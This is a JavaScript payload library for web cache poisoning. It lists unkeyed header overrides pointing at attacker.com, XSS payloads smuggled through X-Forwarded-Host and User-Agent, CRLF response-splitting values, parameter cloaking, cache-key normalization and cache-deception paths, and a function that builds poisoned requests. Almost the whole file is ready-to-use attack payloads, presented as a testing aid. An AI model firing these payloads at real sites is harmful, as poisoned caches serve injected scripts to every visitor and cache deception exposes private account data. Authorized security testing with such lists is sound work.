// Web Cache Poisoning Payloads
// Comprehensive payload database for cache poisoning testing

const CachePoisoningPayloads = {
    // Unkeyed Headers (commonly used for cache poisoning)
    unkeyedHeaders: [
        { header: 'X-Forwarded-Host', value: 'attacker.com', description: 'Host header override' },
        { header: 'X-Host', value: 'attacker.com', description: 'Alternative host header' },
        { header: 'X-Forwarded-Server', value: 'attacker.com', description: 'Server override' },
        { header: 'X-Original-URL', value: '/admin', description: 'URL override' },
        { header: 'X-Rewrite-URL', value: '/admin', description: 'URL rewrite' },
        { header: 'X-Forwarded-Scheme', value: 'http', description: 'Protocol override' },
        { header: 'X-Forwarded-Proto', value: 'http', description: 'Protocol override' },
        { header: 'X-HTTP-Method-Override', value: 'POST', description: 'Method override' },
        { header: 'X-Original-Host', value: 'attacker.com', description: 'Original host' },
        { header: 'Forwarded', value: 'host=attacker.com', description: 'Forwarded header' }
    ],

    // XSS via cache poisoning
    xssPayloads: [
        { header: 'X-Forwarded-Host', value: 'attacker.com"><script>alert(1)</script>' },
        { header: 'X-Forwarded-Host', value: '"/><script>alert(document.domain)</script>' },
        { header: 'X-Host', value: 'attacker.com"><img src=x onerror=alert(1)>' },
        { header: 'User-Agent', value: '</script><script>alert(1)</script>' }
    ],

    // Fat GET / Parameter cloaking
    parameterCloaking: [
        { technique: 'Fat GET', payload: 'GET /?cb=1 HTTP/1.1\r\n\r\ncallback=evil' },
        { technique: 'Parameter pollution', payload: '?utm_content=x&callback=alert(1)' },
        { technique: 'Unkeyed query string', payload: '?_=random&evil=payload' }
    ],

    // Cache key normalization attacks
    cacheKeyNormalization: [
        { technique: 'Path normalization', payloads: ['/./resources/js/tracking.js', '/../resources/js/tracking.js', '/resources/js/..%2ftracking.js'] },
        { technique: 'Delimiter confusion', payloads: ['/resources;/js/tracking.js', '/resources%3B/js/tracking.js'] },
        { technique: 'Encoding', payloads: ['/%72esources/js/tracking.js', '/resources/js/tracking%2ejs'] }
    ],

    // Cache buster techniques
    cacheBusters: [
        '?cb={{random}}',
        '?cachebuster={{random}}',
        '?_={{random}}',
        '?nocache={{random}}'
    ],

    // Response splitting
    responseSplitting: [
        { header: 'X-Forwarded-Host', value: 'attacker.com\r\nX-Injected: true' },
        { header: 'X-Forwarded-Host', value: 'attacker.com%0d%0aX-Injected:%20true' }
    ],

    // Web cache deception
    cacheDeception: [
        { path: '/my-account.css', description: 'Append static extension' },
        { path: '/my-account/x.js', description: 'Add static file path' },
        { path: '/my-account%2f..%2fstatic.css', description: 'Path traversal with extension' },
        { path: '/my-account;x.css', description: 'Semicolon delimiter' }
    ],

    // Vary header manipulation
    varyHeaderTests: [
        'Accept-Language',
        'Accept-Encoding',
        'User-Agent',
        'Cookie',
        'Origin'
    ]
};

// Test scenarios
const CachePoisoningTests = {
    unkeyedHeader: {
        name: 'Unkeyed Header Injection',
        description: 'Test if headers are reflected but not part of cache key',
        severity: 'HIGH'
    },
    xssViaCache: {
        name: 'XSS via Cache Poisoning',
        description: 'Inject XSS payload via unkeyed header into cached response',
        severity: 'CRITICAL'
    },
    cacheDeception: {
        name: 'Web Cache Deception',
        description: 'Trick cache into storing sensitive responses',
        severity: 'HIGH'
    },
    parameterCloaking: {
        name: 'Parameter Cloaking',
        description: 'Exploit cache key ignoring certain parameters',
        severity: 'MEDIUM'
    },
    fatGet: {
        name: 'Fat GET Request',
        description: 'Include body in GET request to manipulate cache',
        severity: 'MEDIUM'
    }
};

// Helper functions
function getUnkeyedHeaders() {
    return CachePoisoningPayloads.unkeyedHeaders;
}

function getXSSPayloads() {
    return CachePoisoningPayloads.xssPayloads;
}

function getCacheDeceptionPaths() {
    return CachePoisoningPayloads.cacheDeception;
}

function getPayloadCount() {
    return CachePoisoningPayloads.unkeyedHeaders.length +
        CachePoisoningPayloads.xssPayloads.length +
        CachePoisoningPayloads.parameterCloaking.length +
        CachePoisoningPayloads.cacheDeception.length +
        CachePoisoningPayloads.varyHeaderTests.length;
}

function generateCacheBuster() {
    return Math.random().toString(36).substring(7);
}

function buildPoisonedRequest(targetUrl, header, value) {
    return `GET ${targetUrl}?cb=${generateCacheBuster()} HTTP/1.1
Host: TARGET
${header}: ${value}
Connection: close`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        CachePoisoningPayloads,
        CachePoisoningTests,
        getUnkeyedHeaders,
        getXSSPayloads,
        getCacheDeceptionPaths,
        getPayloadCount,
        generateCacheBuster,
        buildPoisonedRequest
    };
}
